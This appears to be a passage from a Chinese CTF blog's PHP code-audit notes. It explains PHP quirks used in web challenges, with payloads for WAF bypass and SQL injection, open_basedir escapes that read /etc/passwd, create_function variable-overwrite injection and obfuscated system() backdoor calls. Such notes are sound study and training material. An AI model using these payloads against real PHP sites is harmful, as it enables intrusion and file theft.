class="hljs-string">&#x27;endtime: &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:                                                            <br>    t = threading.Thread(target=get_content, args=(i,))<br>    t.start()<br></code></pre></td></tr></table></figure><ul><li>替换脚本中的地址为本地 PHP 解压后的地址，修改 URL 地址方便测试能够执行命令。</li></ul><p><img src="/WritenUp.assets%5Cimage-20220529013728647.png" alt="image-20220529013728647"></p><ul><li>因为写的是多线程会出现无法中断的情况，需要留意一下这个文件。</li></ul><p><img src="/WritenUp.assets%5Cimage-20220529013509303.png" alt="image-20220529013509303"></p><ul><li>然后再题目环境中执行命令查看 <code>flag.txt</code> 获取到 flag</li></ul><p><img src="/WritenUp.assets%5Cimage-20220529014035445.png" alt="image-20220529014035445"></p><p><code>flag&#123;this_is_smart_hacker_flag&#125;</code></p><hr><h2 id="small-tips："><a href="#small-tips：" class="headerlink" title="small tips："></a>small tips：</h2><ul><li><code>100.0010</code> 正和反值相等但并非是回文序列</li><li><code>get&#123;var]</code>  ?var[变量名]  ?var[template][tp1]&#x3D;xxx&amp;var[template][tp2]&#x3D;xxx  数组 template 中的 tp1<ul><li>var[]&#x3D;aaaa 默认传了 var[0]&#x3D;aaaa</li><li>通过变量覆盖<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br></code></pre></td></tr></table></figure>传 <code>flag[arg]=&#125;var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></li></ul></li></ul><hr><h2 id="PHP-特性"><a href="#PHP-特性" class="headerlink" title="PHP 特性"></a>PHP 特性</h2><ol><li><p>我们知道 PHP 将查询字符串（在 URL 或正文中）转换为内部 <code>$=GET</code> 或的关联数组 <code>$_POST</code>。例如：<code>/?foo=bar</code> 变成 <code>Array([foo] =&gt; &quot;bar&quot;)</code>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code> 会转换为 <code>Array([news_id] =&gt; 42)</code>。如果一个 IDS&#x2F;IPS 或 WAF 中有一条规则是当 <code>news_id</code> 参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/news.php?%<span class="hljs-number">20</span>news[id%<span class="hljs-number">00</span>=<span class="hljs-number">42</span><span class="hljs-string">&quot;+AND+1=0--</span><br></code></pre></td></tr></table></figure><ul><li><p>上述 PHP 语句的参数 <code>%20news[id%00</code> 的值将存储到 <code>$_GET[&quot;news_id&quot;]</code> 中。</p></li><li><p>PHP 需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><ol><li>删除空白符</li><li>将某些字符转换为下划线（包括空格）<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">20</span>foo_bar%<span class="hljs-number">00</span>                            foo_bar                            foo_bar           <br>foo%<span class="hljs-number">20</span>bar%<span class="hljs-number">00</span>                      foo bar                    foo_bar         <br>foo%<span class="hljs-number">5</span>bbar                            foo[bar                          foo_bar     <br></code></pre></td></tr></table></figure></li></ol></li><li><p><code>?%20num=var_dump(scandir(chr(47)))</code></p></li><li><p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 表示当前 php 文件相对于网站根目录的位置地址，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//www.5idev.com/php/ ：/php/index.php</span><br>http:<span class="hljs-comment">//www.5idev.com/php/index.php ：/php/index.php</span><br>http:<span class="hljs-comment">//www.5idev.com/php/index.php?test=foo ：/php/index.php</span><br>http:<span class="hljs-comment">//www.5idev.com/php/index.php/test/foo ：/php/index.php/test/foo</span><br></code></pre></td></tr></table></figure><ul><li><code>basename</code> 则是返回路径中的文件名部分。但是 basename 有个特性，如果文件名是一个不可见字符，便会将上一个目录作为返回值。比如：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br></code></pre></td></tr></table></figure></li><li><code>basename</code> 例子：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$var1</span>=<span class="hljs-string">&quot;/config.php/test&quot;</span><br><span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$var1</span>)=&gt; test<br><span class="hljs-variable">$var2</span>=<span class="hljs-string">&quot;/config.php/%ff&quot;</span><br><span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$var2</span>)=&gt;config.php<br></code></pre></td></tr></table></figure></li><li>当我们访问一个 <code>存在的文件/不存在的文件</code> 这个 URL 时，php 会自动忽略多余的不存在的部分，比如下面两种 URL：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/index.php<br>/index.php/dosent_exist.php<br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><code>include</code> 有一个很有趣的特性：</p></li></ol><ul><li>如果参数中包含 <code>../</code> 这样的路径，解析器则会忽略 <code>../</code> 之前的字符串而去在当前目录的父目录下寻找文件<ul><li>这意味着我们只要在想要查看的文件路径中使用 <code>../</code> 这类路径，<code>include</code> 就会自动忽略前面的内容，这样真正包含的文件名就是有效的了。一点一点试就可以得到正确的路径了。</li></ul></li></ul><ol start="3"><li><strong>CURLOPT_POSTFIELDS</strong></li></ol><ul><li>全部数据使用 HTTP 协议中的 “POST” 操作来发送。</li></ul><p>要发送文件，在文件名前面加上 <code>@</code> 前缀并使用完整路径。 文件类型可在文件名后以 <code>;type=mimetype</code> 的格式指定。这个参数可以是 <code>urlencoded</code> 后的字符串，类似 <code>&#39;para1=val1&amp;para2=val2&amp;...&#39;</code>，也可以使用一个以字段名为键值，字段数据为值的数组。如果 <code>value</code> 是一个数组，<code>Content-Type</code> 头将会被设置成 <code>multipart/form-data</code>。从 PHP 5.2.0 开始，使用 <code>@</code> 前缀传递文件时，<code>value</code> 必须是个数组。从 PHP 5.5.0 开始, <code>@</code> 前缀已被废弃，文件可通过 <code>CURLFile</code> 发送。设置 <code>CURLOPT_SAFE_UPLOAD</code> 为 <code>true</code> 可禁用 <code>@</code> 前缀发送文件，以增加安全性。</p><ul><li><p><strong>CURLOPT_SAFE_UPLOAD</strong></p></li><li><p>默认 <code>true</code>。禁用 <code>@</code> 前缀在 <code>CURLOPT_POSTFIELDS</code> 中发送文件。意味着 <code>@</code> 可以在字段中安全地使用了。可使用 <code>CURLFile</code> 作为上传的代替。</p></li><li><p>PHP 5.5.0 中添加，默认值 <code>false</code>。 PHP 5.6.0 改默认值为 <code>true</code>。PHP 7 删除了此选项， 必须使用 <code>CURLFile</code> interface 来上传文件。</p></li><li><p>@ 符号出现了。这里的意思就是如果 <code>CURLOPT_SAFE_UPLOAD</code> 为 <code>False</code>，那么在 <code>CURLOPT_POSTFIELDS</code> 要发送的文件名前面加上 <code>@</code> 就可以使用完整路径读取文件了。此时问题又来到了经典的文件任意读取。问题是，读取啥文件呢？我们现在完全不知道 <code>flag</code> 文件在哪。</p></li></ul><hr><h2 id="上传还读取"><a href="#上传还读取" class="headerlink" title="上传还读取"></a>上传还读取</h2><ol><li><strong>无参函数可接受参数</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">a</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>命名空间</strong></li></ol><ul><li>可以简单地理解为一个“文件夹”或“目录”，它用来组织和管理代码中的类、函数、常量等元素，避免名称冲突。</li><li>命名空间 A 和命名空间 B 就像是两个文件夹，每个文件夹里都有一个名为 <code>sayHello()</code> 的函数。由于它们处于不同的命名空间（文件夹）中，所以函数不会互相冲突。</li><li>当你在 PHP 脚本中不指定命名空间时，代码运行在全局命名空间中。PHP 不允许在全局命名空间中重写内置函数（如 <code>sha1()</code>）。</li><li>命名空间的声明方式有两种：<strong>封闭命名空间</strong> 和 <strong>开放命名空间</strong>。你提到的 <code>namespace interesting;</code> 是 <strong>开放命名空间</strong> 的一种声明方式，它不需要使用 <code>&#123;&#125;</code> 包围代码块。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-title class_">function</span> <span class="hljs-title class_">a</span>()&#123;<br><span class="hljs-title class_">echo</span> &#x27;<span class="hljs-title class_">a</span>&#x27;;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">test2</span>&#123;<br><span class="hljs-title class_">function</span> <span class="hljs-title class_">b</span>()&#123;<br><span class="hljs-title class_">echo</span> &#x27;<span class="hljs-title class_">b</span>&#x27;;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;phpinfo changed&#x27;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>\<span class="hljs-title class_">test1</span>\<span class="hljs-title class_">a</span>(); <span class="hljs-comment"># 输出: a</span><br>\test2\<span class="hljs-title function_ invoke__">b</span>(); <span class="hljs-comment"># 输出: b</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>php 里默认命名空间是 <code>\</code>，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名 <code>function_name()</code> 调用，调用的时候其实相当于写了一个相对路径；而如果写 <code>\function_name()</code> 这样调用函数，则其实是写了一个绝对路径。</li><li>如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyNamespace</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Custom phpinfo in MyNamespace&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">phpinfo</span>();  <span class="hljs-comment">// 调用 MyNamespace\phpinfo()，输出 &quot;Custom phpinfo in MyNamespace&quot;</span><br>\<span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-comment">// 调用全局命名空间中的 phpinfo()，输出 PHP 配置信息</span><br></code></pre></td></tr></table></figure><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;arg&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="hljs-variable">$action</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$action</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>传 <code>\create_function</code></li></ul><ol start="3"><li><strong>匿名函数</strong></li></ol><ul><li>变量赋值示例<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$greet</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Hello %s\r\n&quot;</span>, <span class="hljs-variable">$name</span>);<br>&#125;;<br><br><span class="hljs-variable">$greet</span>(<span class="hljs-string">&#x27;World&#x27;</span>);<br><span class="hljs-variable">$greet</span>(<span class="hljs-string">&#x27;PHP&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li>回调函数对匿名函数的调用<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&#x27;~-([a-z])~&#x27;</span>, function (<span class="hljs-variable">$match</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">1</span>]);<br>&#125;, <span class="hljs-string">&#x27;hello-world&#x27;</span>);<br><span class="hljs-comment">// 输出 helloWorld</span><br></code></pre></td></tr></table></figure></li><li>使用 <code>USE</code> 闭包</li><li>可以从父作用域中继承变量。 任何此类变量都应该用 <code>use</code> 语言结构传递进去。 <code>PHP7.1</code> 起，不能传入此类变量：<code>superglobals</code>、<code>$this</code> 或者和参数重名。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><br><span class="hljs-variable">$example</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$message</span>);<br>&#125;;<br><span class="hljs-comment">#echo $example();  // Notice: Undefined variable: message </span><br><br><span class="hljs-variable">$example</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-keyword">use</span> (<span class="hljs-params"><span class="hljs-variable">$message</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$message</span>);<br>&#125;;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>();  <span class="hljs-comment">// string(5) &quot;hello&quot;</span><br><br><br><span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;world&#x27;</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>();   <span class="hljs-comment">//string(5) &quot;hello&quot;</span><br><br><span class="hljs-variable">$example</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) <span class="hljs-keyword">use</span> (<span class="hljs-params"><span class="hljs-variable">$message</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$arg</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$message</span>);<br>&#125;;<br><span class="hljs-variable">$example</span>(<span class="hljs-string">&quot;hello&quot;</span>);   <span class="hljs-comment">// string(11) &quot;hello world&quot;</span><br></code></pre></td></tr></table></figure></li></ul><ol start="4"><li><strong>open_basedir</strong></li></ol><ul><li><p>是 PHP 中的一个配置选项，用于限制脚本可以访问的文件系统路径范围。</p></li><li><p>例子 <code>open_basedir = /var/www/html/:/tmp/</code>   PHP 脚本只能访问 <code>/var/www/html/</code> 目录及其子目录，和 <code>/tmp/</code> 目录。</p></li><li><p>php.ini 文件中设置 <code>open_basedir</code> 选项。</p></li><li><p><strong>绕过方法</strong>：</p><ul><li>利用 <code>ini_set</code> 和 <code>chdir</code>，PHP 配置中未禁用 <code>ini_set</code> 的使用。</li></ul><p>参考：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;subDir&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><ul><li><strong>利用 <code>symlink</code></strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="hljs-number">0777</span>,<span class="hljs-literal">TRUE</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html:bar/&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;foo/../../../../../../&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;bar/etc/passwd&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul></li></ul><ol start="5"><li><strong>PHP 是一门动态语言</strong></li></ol><ul><li>动态语言指在运行时确定数据类型的语言，它拥有一些独特的特性如：动态变量、动态函数执行等。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-string">&#x27;cc&#x27;</span>;<br><span class="hljs-comment">#$a 是 $_GET 的中间变量，$_GET 是最终变量</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;_GET&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$$a</span>); <span class="hljs-comment">//第一个$是找到$a是_GET第二个是找到$_GET 想$this</span><br><br><span class="hljs-variable">$_POST</span> = <span class="hljs-string">&#x27;asdf&#x27;</span>;<br><span class="hljs-variable">$asdf</span> = <span class="hljs-string">&#x27;ccc&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$$_POST</span>);<br></code></pre></td></tr></table></figure><ul><li><p><strong>可变属性名</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$bar</span> = <span class="hljs-string">&#x27;I am bar.&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;I am A.&#x27;</span>, <span class="hljs-string">&#x27;I am B.&#x27;</span>, <span class="hljs-string">&#x27;I am C.&#x27;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$r</span>   = <span class="hljs-string">&#x27;I am r.&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">foo</span>();<br><span class="hljs-variable">$bar</span> = <span class="hljs-string">&#x27;bar&#x27;</span>;<br><span class="hljs-variable">$baz</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;baz&#x27;</span>, <span class="hljs-string">&#x27;quux&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;<span class="hljs-variable">$bar</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;&#123;<span class="hljs-variable">$baz</span>[<span class="hljs-number">1</span>]&#125; . <span class="hljs-string">&quot;\n&quot;</span>;   <span class="hljs-comment">// 等同于 $foo-&gt;bar。因此，输出结果也是 &#x27;I am bar.&#x27;</span><br><br><span class="hljs-variable">$start</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$end</span>   = <span class="hljs-string">&#x27;ar&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;&#123;<span class="hljs-variable">$start</span>.<span class="hljs-variable">$end</span>&#125; . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$arr</span> = <span class="hljs-string">&#x27;arr&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;&#123;<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>]&#125; . <span class="hljs-string">&quot;\n&quot;</span>; <span class="hljs-comment">// 所以 $foo-&gt;&#123;$arr[1]&#125; 实际上是  $foo-&gt;r</span><br></code></pre></td></tr></table></figure></li><li><p><strong>可变变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$a</span>;<br><span class="hljs-keyword">echo</span> $&#123;<span class="hljs-variable">$a</span>&#125;;  <br></code></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$ab</span> = <span class="hljs-string">&#x27;cccc&#x27;</span>;<br><span class="hljs-keyword">echo</span> $&#123;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>动态函数</strong><ol><li><p><strong>动态执行函数</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phPinfo&#x27;</span>; <span class="hljs-comment">#php 的函数忽略大小写，但是变量严格大小写，这样写没问题 而且直接调用 PHpinfo 也不会报错</span><br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure></li><li><p><strong>动态实例化类</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc</span></span>&#123;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;cc&#x27;</span>;<br><span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure></li><li><p><strong>可变函数后门</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]<br><br><br><br>```<span class="hljs-title function_ invoke__">php</span><br>(<span class="hljs-string">&#x27;sys&#x27;</span>.<span class="hljs-string">&#x27;tem&#x27;</span>)(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&quot;&quot;</span>,[<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;tem&quot;</span>])(<span class="hljs-string">&quot;ipconfig&quot;</span>);<br><span class="hljs-title function_ invoke__">implode</span>([<span class="hljs-string">&#x27;sys&#x27;</span>,<span class="hljs-string">&#x27;tem&#x27;</span>])(<span class="hljs-string">&quot;ipconfig&quot;</span>);<br></code></pre></td></tr></table></figure></li></ol></li></ul><ol start="6"><li><strong>深入理解 <code>$_REQUEST</code> 数组</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure><ul><li>这行代码会输出 <code>$_REQUEST</code> 数组中键为 ‘a’ 的值。<code>$_REQUEST</code> 是一个包含了 <code>$_GET</code>、<code>$_POST</code> 和 <code>$_COOKIE</code> 数据的数组，默认情况下，它的顺序是先处理 <code>$_POST</code>，然后是 <code>$_GET</code>，最后是 <code>$_COOKIE</code>。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过Disable_function</title>
    <link href="/2024/08/31/%E7%BB%95%E8%BF%87Disable-function/"/>
